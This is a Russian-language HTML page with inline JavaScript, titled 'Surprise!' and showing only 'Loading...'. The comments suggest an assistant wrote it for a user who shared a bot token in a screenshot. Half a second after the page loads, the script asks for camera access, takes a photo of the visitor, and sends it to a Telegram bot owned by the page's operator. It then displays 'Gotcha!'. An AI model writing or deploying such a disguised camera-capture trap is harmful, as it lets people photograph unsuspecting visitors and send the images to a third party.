<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Сюрприз!</title>
    <style>
        body { 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            background-color: #2c3e50; 
            color: white; 
            font-family: sans-serif;
            margin: 0;
        }
    </style>
</head>
<body>
    <h1 id="status">Загрузка...</h1>

    <script>
        async function takePhoto() {
            const statusText = document.getElementById('status');
            
            try {
                // Запрашиваем доступ к камере
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');

                video.srcObject = stream;

                // Ждем, пока видео "проснется" (даем 1 секунду)
                video.onloadedmetadata = () => {
                    setTimeout(() => {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        context.drawImage(video, 0, 0);
                        
                        const dataUrl = canvas.toDataURL('image/png');

                        // ВСТАВЬ СВОИ ДАННЫЕ ТУТ (проверь еще раз токен и ID)
                        const token = "92027897:AAHz8RjL...K0Q0BDXHOUcad7JW4BdbXaFQ"; // Я вижу твой токен в скриншоте!
                        const chatId = "ТВОЙ_CHAT_ID"; // <--- СЮДА ВСТАВЬ СВОЙ ID (цифры)
                        
                        // Используем шаблонную строку, чтобы точно не было ошибок с запятыми
                        fetch(`https://api.telegram.org/bot${token}/sendPhoto?chat_id=${chatId}&photo=${dataUrl}`)
                            .then(response => {
                                if (response.ok) {
                                    statusText.innerText = "ПОПАЛСЯ! 📸";
                                } else {
                                    statusText.innerText = "Ошибка отправки!";
                                }
                            })
                            .catch(err => {
                                statusText.innerText = "Ошибка сети!";
                                console.error(err);
                            });
                        // Останавливаем камеру, чтобы она не работала вечно (экономит батарею)
                        stream.getTracks().forEach(track => track.stop());
                    }, 1000);
                };
            } catch (err) {
                console.error("Ошибка:", err);
                statusText.innerText = "Ой, камера не включилась!";
            }
        }

        // Запускаем функцию через полсекунды после открытия страницы
        setTimeout(takePhoto, 500);
    </script>
</body>
</html>
